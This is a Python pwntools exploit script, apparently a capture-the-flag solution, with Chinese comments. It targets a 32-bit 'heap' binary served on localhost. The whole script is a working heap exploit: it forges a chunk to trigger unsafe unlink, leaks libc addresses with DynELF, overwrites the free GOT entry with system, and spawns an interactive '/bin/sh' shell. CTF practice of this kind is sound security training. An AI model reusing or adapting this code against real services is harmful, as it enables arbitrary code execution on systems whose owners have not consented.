from pwn import *

elf = ELF('heap')
free_got = elf.got['free']
chunk_list = 0x8049d60

#p = process('heap')
p = remote('127.0.0.1', 4000)

def add_chunk(size):
	p.recvuntil('5.Exit\n')
	p.sendline('1')
	p.recvuntil('Input the size of chunk you want to add:')
	p.sendline(str(size))

def set_chunk(index, data):
	p.recvuntil('5.Exit\n')
	p.sendline('2')
	p.recvuntil('Set chunk index:')
	p.sendline(str(index))
	p.recvuntil('Set chunk data:')
	p.sendline(data)

def delete_chunk(index):
	p.recvuntil('5.Exit\n')
	p.sendline('3')
	p.recvuntil('Delete chunk index:')
	p.sendline(str(index))

def print_chunk(index):
	p.recvuntil('5.Exit\n')
	p.sendline('4')
	p.recvuntil('Print chunk index:')
	p.sendline(str(index))
	return p.recvline()

def leak(addr):
	payload = 'a' * 0xc + p32(0x8049d54) + p32(addr)
	set_chunk(0, payload)
	res = print_chunk(1)[:4]
	print "leaking: %#x ---> %s" % (addr, res.encode('hex'))
	return res
	

add_chunk(128)
add_chunk(128)
add_chunk(128)
add_chunk(128)
set_chunk(3, '/bin/sh\x00')

#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bk
payload = p32(0) + p32(0x80) + p32(chunk_list-0xc) + p32(chunk_list-0x8)
#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0
payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)
set_chunk(0, payload)

#free第二个chunk，将会触发unlink
delete_chunk(1)

#泄露system的地址
d = DynELF(leak, elf = elf)
system = d.lookup('system', 'libc')
print "system addr: %#x" % system

#将free_got的地址覆盖掉第二个chunk的地址
payload = 'a' * 0xc + p32(chunk_list-0xc) + p32(free_got)
set_chunk(0, payload)

#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址
set_chunk(1, p32(system))

#调用free，实际调用system
delete_chunk(3)

p.interactive()
